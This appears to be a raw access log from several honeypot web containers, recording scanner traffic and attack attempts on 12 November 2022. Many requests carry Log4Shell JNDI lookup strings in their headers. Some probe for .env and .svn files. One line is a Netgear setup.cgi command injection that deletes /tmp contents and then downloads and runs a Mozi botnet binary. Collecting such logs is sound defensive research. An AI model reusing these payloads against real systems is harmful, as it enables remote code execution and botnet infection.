swipe-t-2_running | 20.4.210.27 | 12/Nov/2022:17:26:19 | GET /.svn/ HTTP/1.1 | - | Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36 | y
it-t-2_running | 146.19.24.176 | 12/Nov/2022:18:57:46 | GET /.env HTTP/1.1 | - | Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30 | y
it-t-2_running | 146.19.24.176 | 12/Nov/2022:18:57:46 | POST / HTTP/1.1 | - | Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30 | n
blank-t_running | 31.14.115.42 | 12/Nov/2022:19:26:48 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
blank-t_running | 129.154.55.234 | 12/Nov/2022:19:33:45 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
blank-t-2_running | 146.19.24.176 | 12/Nov/2022:18:57:47 | GET /.env HTTP/1.1 | - | Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30 | y
blank-t-2_running | 146.19.24.176 | 12/Nov/2022:18:57:47 | POST / HTTP/1.1 | - | Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30 | n
blank-t_running | 92.118.39.78 | 12/Nov/2022:19:47:50 | GET / HTTP/1.1 | - | - | y
swipe-t_running | 146.19.24.176 | 12/Nov/2022:18:57:48 | GET /.env HTTP/1.1 | - | Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30 | y
swipe-t_running | 146.19.24.176 | 12/Nov/2022:18:57:48 | POST / HTTP/1.1 | - | Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30 | n
swipe-t_running | 37.44.238.183 | 12/Nov/2022:18:58:22 | POST /boaform/admin/formLogin HTTP/1.1 | http://128.8.238.179:80/admin/login.asp | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0 | n
blank-t_running | 213.255.16.153 | 12/Nov/2022:19:57:57 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
blank-t_running | 209.216.177.158 | 12/Nov/2022:20:07:49 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
swipe-t-2_running | 162.142.125.10 | 12/Nov/2022:19:57:27 | GET / HTTP/1.1 | - | - | y
swipe-t-2_running | 162.142.125.10 | 12/Nov/2022:19:57:27 | GET / HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
swipe-t-2_running | 162.142.125.10 | 12/Nov/2022:19:57:27 | PRI command-cache.json cron_jobs force_cleanup.sh honeypot_environment nat_rules.sh process_complete_container.sh README.md serve_honeypot.sh start_all_honeypots.sh start_up HTTP/2.0 | - | - | n
swipe-t-2_running | 162.142.125.10 | 12/Nov/2022:19:57:32 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
swipe-t-2_running | 192.241.199.219 | 12/Nov/2022:19:58:30 | GET /portal/redlion HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
swipe-t-2_running | 162.142.125.8 | 12/Nov/2022:20:05:27 | GET / HTTP/1.1 | - | - | y
swipe-t-2_running | 162.142.125.8 | 12/Nov/2022:20:05:28 | GET / HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
swipe-t-2_running | 162.142.125.8 | 12/Nov/2022:20:05:28 | PRI command-cache.json cron_jobs force_cleanup.sh honeypot_environment nat_rules.sh process_complete_container.sh README.md serve_honeypot.sh start_all_honeypots.sh start_up HTTP/2.0 | - | - | n
swipe-t-2_running | 162.142.125.8 | 12/Nov/2022:20:05:34 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
swipe-t-2_running | 192.241.200.149 | 12/Nov/2022:20:12:07 | GET /actuator/health HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
pwd-t_running | 192.241.199.219 | 12/Nov/2022:19:58:31 | GET /portal/redlion HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
pwd-t_running | 192.241.200.149 | 12/Nov/2022:20:12:07 | GET /actuator/health HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
pwd-t_running | 92.118.39.78 | 12/Nov/2022:20:22:09 | GET / HTTP/1.1 | - | - | y
it-t_running | 183.136.225.32 | 12/Nov/2022:19:50:37 | GET / HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0 | y
it-t_running | 183.136.225.32 | 12/Nov/2022:19:58:31 | GET /sites/default/files/favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
it-t_running | 183.136.225.32 | 12/Nov/2022:19:58:31 | GET /robots.txt HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
it-t_running | 192.241.199.219 | 12/Nov/2022:19:58:45 | GET /portal/redlion HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
it-t_running | 192.241.200.149 | 12/Nov/2022:20:12:06 | GET /actuator/health HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
it-t-2_running | 37.44.238.183 | 12/Nov/2022:19:39:46 | POST /boaform/admin/formLogin HTTP/1.1 | http://128.8.238.70:80/admin/login.asp | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0 | n
it-t-2_running | 192.241.199.219 | 12/Nov/2022:19:58:43 | GET /portal/redlion HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
it-t-2_running | 92.118.39.78 | 12/Nov/2022:19:59:47 | GET / HTTP/1.1 | - | - | y
it-t-2_running | 192.241.200.149 | 12/Nov/2022:20:12:13 | GET /actuator/health HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
it-t-2_running | 181.128.29.151 | 12/Nov/2022:20:24:06 | GET / HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7 | y
blank-t_running | 213.255.16.153 | 12/Nov/2022:20:39:35 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
blank-t-2_running | 192.241.199.219 | 12/Nov/2022:19:58:44 | GET /portal/redlion HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
blank-t-2_running | 192.241.200.149 | 12/Nov/2022:20:12:18 | GET /actuator/health HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
it-t_running | 92.118.39.78 | 12/Nov/2022:20:32:47 | GET / HTTP/1.1 | - | - | y
it-t_running | 185.180.143.76 | 12/Nov/2022:20:54:20 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36 | y
swipe-t_running | 192.241.200.149 | 12/Nov/2022:20:12:10 | GET /actuator/health HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
swipe-t_running | 85.113.204.13 | 12/Nov/2022:20:26:14 | GET / HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7 | y
blank-t_running | 144.22.130.100 | 12/Nov/2022:21:13:09 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
swipe-t-2_running | 109.237.98.226 | 12/Nov/2022:20:18:48 | GET /.env HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36 | y
swipe-t-2_running | 109.237.98.226 | 12/Nov/2022:20:18:48 | \x16\x03\x01\x01H\x01 | - | - | n
swipe-t-2_running | 87.236.176.101 | 12/Nov/2022:20:44:33 | GET / HTTP/1.1 | - | Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/) | y
swipe-t-2_running | 92.118.39.78 | 12/Nov/2022:20:49:47 | GET / HTTP/1.1 | - | - | y
swipe-t-2_running | 197.232.30.172 | 12/Nov/2022:20:58:13 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 | y
swipe-t-2_running | 64.227.37.160 | 12/Nov/2022:21:08:28 | \x16\x03\x01 | - | - | n
swipe-t-2_running | 64.227.37.160 | 12/Nov/2022:21:08:28 | \x16\x03\x01 | - | - | n
swipe-t-2_running | 64.227.37.160 | 12/Nov/2022:21:08:28 | GET / HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
it-t_running | 82.64.113.245 | 12/Nov/2022:21:08:43 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
it-t_running | 59.3.186.45 | 12/Nov/2022:21:13:42 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
it-t_running | 209.216.177.158 | 12/Nov/2022:21:15:37 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
it-t_running | 117.16.44.111 | 12/Nov/2022:21:17:20 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
it-t_running | 112.160.137.62 | 12/Nov/2022:21:17:47 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
it-t_running | 103.105.12.48 | 12/Nov/2022:21:18:55 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
it-t_running | 129.154.55.234 | 12/Nov/2022:21:19:46 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
pwd-t_running | 119.6.131.5 | 12/Nov/2022:20:33:54 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
pwd-t_running | 117.80.212.33 | 12/Nov/2022:20:41:04 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
pwd-t_running | 120.224.143.251 | 12/Nov/2022:20:42:50 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
pwd-t_running | 129.154.55.234 | 12/Nov/2022:20:51:10 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
pwd-t_running | 194.146.24.107 | 12/Nov/2022:21:13:08 | GET / HTTP/1.1 | - | Hello World | y
blank-t_running | 194.146.24.107 | 12/Nov/2022:21:28:44 | GET / HTTP/1.1 | - | Hello World | y
blank-t_running | 163.172.133.17 | 12/Nov/2022:21:31:17 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
it-t-2_running | 178.62.208.18 | 12/Nov/2022:20:51:16 | \x16\x03\x01 | - | - | n
it-t-2_running | 178.62.208.18 | 12/Nov/2022:20:51:16 | GET / HTTP/1.1 | - | Mozilla/5.0 zgrab/0.x | y
it-t-2_running | 194.146.24.107 | 12/Nov/2022:21:22:36 | GET / HTTP/1.1 | - | Hello World | y
blank-t-2_running | 92.118.39.78 | 12/Nov/2022:20:50:10 | GET / HTTP/1.1 | - | - | y
blank-t-2_running | 194.146.24.107 | 12/Nov/2022:21:22:23 | GET / HTTP/1.1 | - | Hello World | y
blank-t_running | 223.171.91.158 | 12/Nov/2022:22:00:47 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
pwd-t-2_running | 89.121.228.38 | 12/Nov/2022:12:35:29 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
pwd-t-2_running | 209.216.177.158 | 12/Nov/2022:12:36:49 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
pwd-t-2_running | 85.105.82.39 | 12/Nov/2022:12:39:03 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
pwd-t-2_running | 117.80.212.33 | 12/Nov/2022:12:39:37 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
pwd-t-2_running | 146.56.115.253 | 12/Nov/2022:12:41:18 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
pwd-t-2_running | 180.93.32.58 | 12/Nov/2022:12:42:04 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
pwd-t-2_running | 89.100.220.200 | 12/Nov/2022:12:43:07 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
pwd-t-2_running | 112.160.137.62 | 12/Nov/2022:12:43:19 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
pwd-t-2_running | 129.154.55.234 | 12/Nov/2022:12:43:33 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
pwd-t-2_running | 144.22.191.115 | 12/Nov/2022:12:44:55 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
pwd-t-2_running | 124.221.181.83 | 12/Nov/2022:12:46:47 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
pwd-t-2_running | 120.86.239.200 | 12/Nov/2022:12:47:04 | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0 | - | - | y
pwd-t-2_running | 40.87.11.253 | 12/Nov/2022:12:47:09 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
pwd-t-2_running | 59.3.186.45 | 12/Nov/2022:12:49:01 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
pwd-t-2_running | 89.121.228.38 | 12/Nov/2022:12:52:56 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
pwd-t-2_running | 118.218.209.149 | 12/Nov/2022:12:55:09 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
pwd-t-2_running | 85.51.24.68 | 12/Nov/2022:12:59:02 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
